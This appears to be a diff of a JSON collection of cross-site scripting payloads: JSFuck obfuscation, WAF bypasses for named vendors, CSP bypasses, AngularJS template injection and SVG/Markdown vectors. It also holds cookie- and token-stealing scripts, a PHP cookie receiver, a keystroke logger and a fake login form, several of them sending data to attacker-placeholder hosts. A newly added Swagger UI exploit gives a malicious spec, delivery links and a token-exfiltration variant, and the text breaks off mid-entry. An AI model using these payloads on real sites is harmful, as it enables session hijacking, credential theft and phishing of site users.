-      "tags": ["filter-bypass", "jsfuck", "obfuscation"],
+      "tags": [
+        "filter-bypass",
+        "jsfuck",
+        "obfuscation"
+      ],
       "body": "// Katakana (aemkei/katakana.js)\njavascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()\n\n// Cuneiform\n𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],\n𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]\n+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]\n+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+\"(𒀀)\")()",
       "meta": "JSFuck-style obfuscation using the Katakana/Cuneiform/Lontara alphabets - bypasses signature-based filters. More alphabets: aem1k.com/aurebesh.js."
     },
@@ -479,16 +680,22 @@
       "subcategory": "Filter bypass",
       "title": "Bypassing via JSFuck",
       "language": "javascript",
-      "tags": ["filter-bypass", "jsfuck", "obfuscation"],
+      "tags": [
+        "filter-bypass",
+        "jsfuck",
+        "obfuscation"
+      ],
       "body": "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()",
       "meta": "Entirely from the characters []()!+ - http://www.jsfuck.com/."
     },
-
     {
       "subcategory": "WAF bypass",
       "title": "Cloudflare",
       "language": "html",
-      "tags": ["waf-bypass", "cloudflare"],
+      "tags": [
+        "waf-bypass",
+        "cloudflare"
+      ],
       "body": "<svg/onrandom=random onload=confirm(1)>\n<video onnull=null onmouseover=confirm(1)>\n<svg/OnLoad=\"`${prompt``}`\">\n<svg/onload=%26nbsp;alert`bohdan`+\n1'\"><img/src/onerror=.1|alert``>\n<svg onload=prompt%26%230000000040document.domain)>\n<svg onload=prompt%26%23x000000028;document.domain)>\nxss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>\n<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f\n<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>",
       "meta": "A collection of Cloudflare bypasses (2018-2021), mostly from @bohdansec."
     },
@@ -496,44 +703,62 @@
       "subcategory": "WAF bypass",
       "title": "Incapsula WAF",
       "language": "html",
-      "tags": ["waf-bypass", "incapsula"],
+      "tags": [
+        "waf-bypass",
+        "incapsula"
+      ],
       "body": "<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>\nanythinglr00</script><script>alert(document.domain)</script>uxldz\nanythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz\n<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"
     },
     {
       "subcategory": "WAF bypass",
       "title": "Akamai WAF",
       "language": "html",
-      "tags": ["waf-bypass", "akamai"],
+      "tags": [
+        "waf-bypass",
+        "akamai"
+      ],
       "body": "?\"></script><base%20c%3D=href%3Dhttps:\\mysite>\n<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>"
     },
     {
       "subcategory": "WAF bypass",
       "title": "WordFence WAF",
       "language": "html",
-      "tags": ["waf-bypass", "wordfence"],
+      "tags": [
+        "waf-bypass",
+        "wordfence"
+      ],
       "body": "<a href=javas&#99;ript:alert(1)>"
     },
     {
       "subcategory": "WAF bypass",
       "title": "Fortiweb / Chrome Auditor",
       "language": "html",
-      "tags": ["waf-bypass", "fortiweb"],
+      "tags": [
+        "waf-bypass",
+        "fortiweb"
+      ],
       "body": "\\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e\n</script><svg><script>alert(1)-%26apos%3B",
       "meta": "The first is for Fortiweb (@rezaduty); the second is for the deprecated Chrome XSS Auditor."
     },
-
     {
       "subcategory": "CSP bypass",
       "title": "Tools for CSP",
       "language": "text",
-      "tags": ["csp", "tools"],
+      "tags": [
+        "csp",
+        "tools"
+      ],
       "body": "csp-evaluator.withgoogle.com - checks how strong a CSP is against XSS.\ngmsgadget.com (GMSGadget) - a collection of JS gadgets for bypassing CSP and sanitizers (DOMPurify).\nJSONBee/jsonp.txt - ready-made JSONP endpoints for bypassing."
     },
     {
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP via JSONP",
       "language": "html",
-      "tags": ["csp", "jsonp", "bypass"],
+      "tags": [
+        "csp",
+        "jsonp",
+        "bypass"
+      ],
       "body": "<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>\"",
       "meta": "If the whitelist contains google.com/youtube.com - use their JSONP callback. Examples: //google.com/complete/search?client=chrome&jsonp=alert(1); https://accounts.google.com/o/oauth2/revoke?callback=alert(1337); https://www.youtube.com/oembed?callback=alert;"
     },
@@ -541,7 +766,11 @@
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP default-src (iframe + appendChild)",
       "language": "javascript",
-      "tags": ["csp", "default-src", "bypass"],
+      "tags": [
+        "csp",
+        "default-src",
+        "bypass"
+      ],
       "body": "script=document.createElement('script');\nscript.src='//[ATTACKER.DOMAIN.TLD]/csp.js';\nwindow.frames[0].document.head.appendChild(script);",
       "meta": "For CSP default-src 'self' 'unsafe-inline'. Create an iframe with a same-origin document and add an external script into its head. Source: lab.wallarm.com."
     },
@@ -549,7 +778,11 @@
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP inline/eval (CSS link -> iframe)",
       "language": "javascript",
-      "tags": ["csp", "eval", "bypass"],
+      "tags": [
+        "csp",
+        "eval",
+        "bypass"
+      ],
       "body": "d=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[ATTACKER.DOMAIN.TLD]\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)",
       "meta": "Source: Rhynorater."
     },
@@ -557,7 +790,11 @@
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP script-src 'self' (object + data:)",
       "language": "html",
-      "tags": ["csp", "script-src", "data-scheme"],
+      "tags": [
+        "csp",
+        "script-src",
+        "data-scheme"
+      ],
       "body": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
       "meta": "base64 = <script>alert(1)</script>. Source: @akita_zen."
     },
@@ -565,7 +802,11 @@
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP script-src data:",
       "language": "html",
-      "tags": ["csp", "script-src", "data-scheme"],
+      "tags": [
+        "csp",
+        "script-src",
+        "data-scheme"
+      ],
       "body": "<script src=\"data:,alert(1)\">/</script>",
       "meta": "For CSP script-src 'self' data: - as the Mozilla documentation warns."
     },
@@ -573,7 +814,10 @@
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP unsafe-inline",
       "language": "html",
-      "tags": ["csp", "unsafe-inline"],
+      "tags": [
+        "csp",
+        "unsafe-inline"
+      ],
       "body": "\"/><script>alert(1);</script>",
       "meta": "For script-src ... 'unsafe-inline' - inline scripts are allowed."
     },
@@ -581,7 +825,11 @@
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP nonce (<base> injection)",
       "language": "html",
-      "tags": ["csp", "nonce", "base-tag"],
+      "tags": [
+        "csp",
+        "nonce",
+        "base-tag"
+      ],
       "body": "<base href=http://[ATTACKER.DOMAIN.TLD]>",
       "meta": "If there is a script with a relative path <script src='/PATH.js'> - the <base> tag will redirect its loading to your server (host your own /PATH.js at the same path)."
     },
@@ -589,16 +837,22 @@
       "subcategory": "CSP bypass",
       "title": "Bypassing CSP sent via PHP header()",
       "language": "text",
-      "tags": ["csp", "php", "bypass"],
+      "tags": [
+        "csp",
+        "php",
+        "bypass"
+      ],
       "body": "GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a",
       "meta": "In php:apache, PHP cannot set the CSP header if the response body has already begun to be written. Generate a Warning (>1000 GET/POST parameters or 20 $_FILES) -> 'headers already sent' -> CSP won't be applied. Source: @pilvar222."
     },
-
     {
       "subcategory": "Angular / CSTI",
       "title": "AngularJS 1.6+ - basic CSTI",
       "language": "javascript",
-      "tags": ["angular", "csti"],
+      "tags": [
+        "angular",
+        "csti"
+      ],
       "body": "{{constructor.constructor('alert(1)')()}}",
       "meta": "Requires an ng-app directive on the root element. As of version 1.6 AngularJS removed the sandbox. Also works for AngularJS 1.0.1-1.1.5 and Vue JS."
     },
@@ -606,7 +860,10 @@
       "subcategory": "Angular / CSTI",
       "title": "AngularJS 1.6.0 - constructor variants",
       "language": "javascript",
-      "tags": ["angular", "csti"],
+      "tags": [
+        "angular",
+        "csti"
+      ],
       "body": "{{0[a='constructor'][a]('alert(1)')()}}\n{{$eval.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}",
       "meta": "From @LewisArdern and @garethheyes."
     },
@@ -614,7 +871,11 @@
       "subcategory": "Angular / CSTI",
       "title": "AngularJS - bypass without quotes",
       "language": "javascript",
-      "tags": ["angular", "csti", "no-quotes"],
+      "tags": [
+        "angular",
+        "csti",
+        "no-quotes"
+      ],
       "body": "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}",
       "meta": "Without single or double quotes, from @Viren. fromCharCode(97,108,...) = alert(1)."
     },
@@ -622,7 +883,11 @@
       "subcategory": "Angular / CSTI",
       "title": "AngularJS - bypass without quotes and the word constructor",
       "language": "javascript",
-      "tags": ["angular", "csti", "bypass"],
+      "tags": [
+        "angular",
+        "csti",
+        "bypass"
+      ],
       "body": "{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",
       "meta": "a = 767015343..toString(36)+50986827..toString(36) = 'constructor'. The payload = prompt(document.domain)."
     },
@@ -630,14 +895,22 @@
       "subcategory": "Angular / CSTI",
       "title": "AngularJS - Imperva WAF bypass",
       "language": "javascript",
-      "tags": ["angular", "csti", "waf-bypass"],
+      "tags": [
+        "angular",
+        "csti",
+        "waf-bypass"
+      ],
       "body": "{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\\\u{6f}mpt(d\\\\u{6f}cument.d\\\\u{6f}main)')()}}"
     },
     {
       "subcategory": "Angular / CSTI",
       "title": "AngularJS - Blind XSS (loading an external script)",
       "language": "javascript",
-      "tags": ["angular", "csti", "blind"],
+      "tags": [
+        "angular",
+        "csti",
+        "blind"
+      ],
       "body": "{{\n    $on.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}",
       "meta": "For 1.0.1-1.1.5 and >1.6.0 (Lewis Ardern, Gareth Heyes). Loads //localhost/m. The older variant uses constructor.constructor instead of $on.constructor."
     },
@@ -645,16 +918,23 @@
       "subcategory": "Angular / CSTI",
       "title": "Angular - sanitizer bypass (bypassSecurityTrust*)",
       "language": "text",
-      "tags": ["angular", "sanitizer", "code-review"],
+      "tags": [
+        "angular",
+        "sanitizer",
+        "code-review"
+      ],
       "body": "bypassSecurityTrustHtml\nbypassSecurityTrustScript\nbypassSecurityTrustStyle\nbypassSecurityTrustUrl\nbypassSecurityTrustResourceUrl",
       "meta": "Angular sanitizes values by default. These DomSanitizer methods mark a value as trusted and disable sanitization. During code review, make sure no user input reaches them - otherwise XSS (e.g. bypassSecurityTrustUrl('javascript:alert(\"Hi there\")'))."
     },
-
     {
       "subcategory": "Files: SVG / XML / MathML",
       "title": "XSS in XML (CDATA)",
       "language": "html",
-      "tags": ["xml", "file", "cdata"],
+      "tags": [
+        "xml",
+        "file",
+        "cdata"
+      ],
       "body": "<name>\n  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>\n</name>",
       "meta": "The CDATA section is needed so the JS payload is not interpreted as XML markup."
     },
@@ -662,14 +942,21 @@
       "subcategory": "Files: SVG / XML / MathML",
       "title": "XSS in XHTML (xmlns)",
       "language": "html",
-      "tags": ["xml", "xhtml", "file"],
+      "tags": [
+        "xml",
+        "xhtml",
+        "file"
+      ],
       "body": "<html>\n<head></head>\n<body>\n<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>\n</body>\n</html>"
     },
     {
       "subcategory": "Files: SVG / XML / MathML",
       "title": "XSS in SVG - simple (green triangle)",
       "language": "html",
-      "tags": ["svg", "file"],
+      "tags": [
+        "svg",
+        "file"
+      ],
       "body": "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n  <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n  <script type=\"text/javascript\">\n    alert(document.domain);\n  </script>\n</svg>",
       "meta": "Upload it as a .svg file - the script will execute when opened in a browser."
     },
@@ -677,7 +964,11 @@
       "subcategory": "Files: SVG / XML / MathML",
       "title": "XSS in SVG - all vectors (red lightning)",
       "language": "html",
-      "tags": ["svg", "file", "comprehensive"],
+      "tags": [
+        "svg",
+        "file",
+        "comprehensive"
+      ],
       "body": "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('svg attribut')\">\n  <polygon id=\"lightning\" points=\"0,100 50,25 50,75 100,0\" fill=\"#ff1919\" stroke=\"#ff0000\"/>\n  <desc><script>alert('svg desc')</script></desc>\n  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>\n  <foreignObject width=\"500\" height=\"500\">\n    <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert('svg foreignObject iframe');\" width=\"400\" height=\"250\"/>\n  </foreignObject>\n  <title><script>alert('svg title')</script></title>\n  <animatetransform onbegin=\"alert('svg animatetransform onbegin')\"></animatetransform>\n  <script type=\"text/javascript\">\n    alert('svg script');\n  </script>\n</svg>",
       "meta": "Vectors: svg onload attribute, desc/foreignObject/title script, foreignObject iframe, animatetransform onbegin. Author: noraj."
     },
@@ -685,14 +976,21 @@
       "subcategory": "Files: SVG / XML / MathML",
       "title": "Short SVG payloads",
       "language": "html",
-      "tags": ["svg", "short"],
+      "tags": [
+        "svg",
+        "short"
+      ],
       "body": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n\n<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>\n<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>\n<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>"
     },
     {
       "subcategory": "Files: SVG / XML / MathML",
       "title": "Nested SVG (sub-SVG, french flag)",
       "language": "html",
-      "tags": ["svg", "nested", "file"],
+      "tags": [
+        "svg",
+        "nested",
+        "file"
+      ],
       "body": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <svg x=\"10\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #002654\"/>\n    <script type=\"text/javascript\">alert('sub-svg 1');</script>\n  </svg>\n  <svg x=\"200\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #ED2939\"/>\n    <script type=\"text/javascript\">alert('sub-svg 2');</script>\n  </svg>\n</svg>",
       "meta": "Loading a remote SVG via xlink:href does NOT trigger the nested XSS; but embedding an <svg> inside an SVG document executes the XSS from the sub-SVG. Author: noraj."
     },
@@ -700,32 +998,43 @@
       "subcategory": "Files: SVG / XML / MathML",
       "title": "XSS in Markdown",
       "language": "text",
-      "tags": ["markdown", "file"],
+      "tags": [
+        "markdown",
+        "file"
+      ],
       "body": "[a](javascript:prompt(document.cookie))\n[a](j a v a s c r i p t:prompt(document.cookie))\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)"
     },
     {
       "subcategory": "Files: SVG / XML / MathML",
       "title": "XSS in CSS (</style> breakout)",
       "language": "html",
-      "tags": ["css", "file", "style-breakout"],
+      "tags": [
+        "css",
+        "file",
+        "style-breakout"
+      ],
       "body": "<!DOCTYPE html>\n<html>\n<head>\n<style>\ndiv  {\n    background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");\n    background-color: #cccccc;\n}\n</style>\n</head>\n  <body>\n    <div>lol</div>\n  </body>\n</html>",
       "meta": "The literal </style> inside a CSS value closes the style block and lets you insert <svg onload>."
     },
-
     {
       "subcategory": "PostMessage",
       "title": "XSS via postMessage (targetOrigin *)",
       "language": "html",
-      "tags": ["postmessage", "dom"],
+      "tags": [
+        "postmessage",
+        "dom"
+      ],
       "body": "<html>\n<body>\n    <input type=button value=\"Click Me\" id=\"btn\">\n</body>\n\n<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://10.10.10.10/#login');\n    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n</script>\n</html>",
       "meta": "If the target origin is '*', the message can be sent to any domain that has a reference to the child page. A vulnerable listener that trusts the url from the message will execute javascript:."
     },
-
     {
       "subcategory": "Blind XSS",
       "title": "Blind XSS - loading an external script",
       "language": "html",
-      "tags": ["blind", "xss-hunter"],
+      "tags": [
+        "blind",
+        "xss-hunter"
+      ],
       "body": "\"><script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"></script>\n\"><script src=//[ATTACKER.DOMAIN.TLD]></script>\n<script>$.getScript(\"//[ATTACKER.DOMAIN.TLD]\")</script>",
       "meta": "XSS Hunter (xsshunter.com) is deprecated; there is a self-hosted version (mandatoryprogrammer/xsshunter-express) and xsshunter.trufflesecurity.com. Other tools: sleepy-puppy, bXSS, ezXSS."
     },
@@ -733,16 +1042,23 @@
       "subcategory": "Blind XSS",
       "title": "Blind XSS - where to look and a quick check",
       "language": "html",
-      "tags": ["blind", "recon", "methodology"],
+      "tags": [
+        "blind",
+        "recon",
+        "methodology"
+      ],
       "body": "<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>",
       "meta": "Injection points: contact forms, ticket support, the Referer/User-Agent headers (admin-panel logs and analytics), comments. Before launching a heavy blind-XSS tool, confirm the trigger with a simple grabber + a one-line HTTP server: ruby -run -ehttpd . -p8080"
     },
-
     {
       "subcategory": "Exfiltration / PoC",
       "title": "Cookie / token theft (Data Grabber)",
       "language": "html",
-      "tags": ["cookie-stealing", "exfil", "poc"],
+      "tags": [
+        "cookie-stealing",
+        "exfil",
+        "poc"
+      ],
       "body": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>\n<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>\n<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>\n<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
       "meta": "Sends the admin's cookie/access_token to a page you control. The new Image() variant works stealthily (without a redirect)."
     },
@@ -750,7 +1066,11 @@
       "subcategory": "Exfiltration / PoC",
       "title": "Server-side cookie receiver (PHP grabber)",
       "language": "text",
-      "tags": ["cookie-stealing", "exfil", "php"],
+      "tags": [
+        "cookie-stealing",
+        "exfil",
+        "php"
+      ],
       "body": "<?php\n$cookie = $_GET['c'];\n$fp = fopen('cookies.txt', 'a+');\nfwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\");\nfclose($fp);\n?>",
       "meta": "grabber.php - writes the received cookies to the file cookies.txt."
     },
@@ -758,14 +1078,22 @@
       "subcategory": "Exfiltration / PoC",
       "title": "Exfiltration via CORS fetch",
       "language": "html",
-      "tags": ["exfil", "cors", "fetch"],
+      "tags": [
+        "exfil",
+        "cors",
+        "fetch"
+      ],
       "body": "<script>\n  fetch('https://[ATTACKER.DOMAIN.TLD]', {\n  method: 'POST',\n  mode: 'no-cors',\n  body: document.cookie\n  });\n</script>"
     },
     {
       "subcategory": "Exfiltration / PoC",
       "title": "JavaScript keylogger",
       "language": "html",
-      "tags": ["keylogger", "exfil", "poc"],
+      "tags": [
+        "keylogger",
+        "exfil",
+        "poc"
+      ],
       "body": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
       "meta": "Captures keystrokes and sends them to the attacker's server."
     },
@@ -773,16 +1101,23 @@
       "subcategory": "Exfiltration / PoC",
       "title": "UI Redressing - fake login form",
       "language": "html",
-      "tags": ["ui-redressing", "phishing", "poc"],
+      "tags": [
+        "ui-redressing",
+        "phishing",
+        "poc"
+      ],
       "body": "<script>\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"\n</script>",
       "meta": "Through XSS, replaces the page content with a fake login form (and also fixes the URL via history.replaceState)."
     },
-
     {
       "subcategory": "Mutation XSS",
       "title": "Mutation XSS (mXSS, DOMPurify bypass)",
       "language": "html",
-      "tags": ["mxss", "mutation", "dompurify"],
+      "tags": [
+        "mxss",
+        "mutation",
+        "dompurify"
+      ],
       "body": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
       "meta": "Uses browser quirks to reassemble HTML tags via innerHTML mutations. Masato Kinugawa's example against cure53/DOMPurify on Google Search."
     },
@@ -790,7 +1125,12 @@
       "subcategory": "Modern vectors",
       "title": "Modern auto-events and wrappers (popover, onformdata, import)",
       "language": "html",
-      "tags": ["modern", "waf-bypass", "popover", "import"],
+      "tags": [
+        "modern",
+        "waf-bypass",
+        "popover",
+        "import"
+      ],
       "body": "<!-- Popover API (HTML 2023+): ontoggle / onbeforetoggle when the popover opens -->\n<button popovertarget=p>click</button><div id=p popover onbeforetoggle=alert(1)>x</div>\n\n<!-- SVG <use> with an external data: document (the filter waits for inline <script>, there is none) -->\n<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/></svg>\n\n<!-- onformdata: fires on form submit -->\n<form onformdata=alert(1)><button>send</button></form>\n\n<!-- Dynamic import(): loads an ES module when eval/Function are blacklisted -->\n<img src=x onerror=\"import('//evil.tld/x.js')\">\n\n<!-- <track> inside media -->\n<video controls><track default onerror=alert(1)></video>",
       "meta": "Low-profile modern vectors against signature WAFs that do not know these tags/handlers yet: Popover API (onbeforetoggle/ontoggle), <svg><use> with a data: URI, onformdata on submit, dynamic import() as an eval replacement, <track onerror>. popover/track need interaction or a media context."
     },
@@ -798,9 +1138,64 @@
       "subcategory": "Modern vectors",
       "title": "Alternative call: Reflect.get, valueOf, hash",
       "language": "javascript",
-      "tags": ["filter-bypass", "obfuscation", "reflect", "dom"],
+      "tags": [
+        "filter-bypass",
+        "obfuscation",
+        "reflect",
+        "dom"
+      ],
       "body": "// Reflect.get builds the name from parts (like obj['name']), bypassing a name blacklist\nReflect.get(window,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))\n\n// window.valueOf=alert + arithmetic on window: implicit coercion calls alert\nwindow.valueOf=alert;window+1\n\n// payload travels in the #fragment (server WAF never sees it, runs in the DOM)\n<svg onload=\"location=location.hash.slice(1)\">  // open as ...#javascript:alert(1)",
       "meta": "Reflect.get(obj,'name') reads a property by an assembled string instead of dot notation (function-name blacklist bypass). window.valueOf=alert plus arithmetic on window triggers alert via implicit number coercion. location.hash.slice(1) carries the payload into the #fragment, invisible to a server-side WAF (pure DOM XSS)."
+    },
+    {
+      "subcategory": "Swagger UI (configUrl)",
+      "title": "Swagger UI ?url=/?configUrl= - DOM-XSS via a remote spec",
+      "language": "text",
+      "tags": [
+        "swagger",
+        "dom-xss",
+        "configurl",
+        "cve-2025-8191",
+        "openapi"
+      ],
+      "body": "Old Swagger UI reads the spec/config location from the query parameters ?url= (spec URL) and ?configUrl= (a JSON config that itself contains a url). By luring a victim to such a link, the attacker makes their Swagger UI load an attacker-hosted OpenAPI spec.\n\nDOM-XSS (the spec is rendered AND executed): swagger-ui >= 3.14.1 and < 3.38.0. The cause is an outdated bundled DOMPurify bypassable by an mXSS gadget in the spec's description field. JS runs in the target origin -> localStorage/token theft (the real Jamf Pro / Shopify case: read authToken from localStorage -> API ATO). This long-known bug was retro-assigned CVE-2025-8191 in 2025 (scanners now flag legacy 3.x under it).\n\nSpoofing / phishing (the spec is merely rendered via ?url=/?configUrl=): any URL-config build < 4.1.3 = CVE-2018-25031. The attacker controls titles, descriptions, fake \"authorize\" / login prompts.\n\nImportant on versions (common confusion): the DOM-XSS fix is 3.38.0, NOT \"< 4.1.3\". The 4.1.3 release (Dec 2021) fixes the SPOOFING: it disables reading config from the URL by default (queryConfigEnabled=false), which removes the whole ?url=/?configUrl= surface unless it is explicitly re-enabled. The high-value target is an embedded old swagger-ui (webjars org.webjars:swagger-ui, springfox) on a 3.14.1-3.37.x engine, or an explicit queryConfigEnabled=true on a newer build.\n\nFingerprint: in the Swagger UI console run JSON.stringify(versions) (present since 3.0.8). Dorks: inurl:\"swagger-ui/index.html\"; Shodan http.title:\"Swagger UI\"."
+    },
+    {
+      "subcategory": "Swagger UI (configUrl)",
+      "title": "Swagger UI: malicious spec (mXSS in description) + delivery",
+      "language": "text",
+      "tags": [
+        "swagger",
+        "dom-xss",
+        "payload",
+        "mxss",
+        "configurl"
+      ],
+      "body": "# Malicious spec (swagger-ui 3.14.1-3.37.x): mXSS gadget in description -> alert(document.domain) in the target origin.\n# (canonical Vidoc Security Lab; the original used alert(window.origin), trivially swapped)\nswagger: '2.0'\ninfo:\n  title: Example yaml.spec\n  description: |\n    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title=\"</textarea><img src='#' onerror='alert(document.domain)'>\">\npaths:\n  /accounts:\n    get:\n      responses:\n        '200':\n          description: No response was specified\n\n# localStorage exfil variant (the Jamf authToken case): only the onerror changes:\n#   onerror='new Image().src=\"https://evil.example/c?t=\"+localStorage.getItem(\"authToken\")'\n\n# Delivery to the victim (a vulnerable, URL-config-enabled Swagger UI):\nhttps://target/swagger-ui/?url=https://evil.example/evil.yaml\nhttps://target/swagger-ui/?configUrl=https://evil.example/evil-config.json   # evil-config.json = {\"url\":\"https://evil.example/evil.yaml\"}\n\n# No hosting needed - data: URI (base64 decodes to 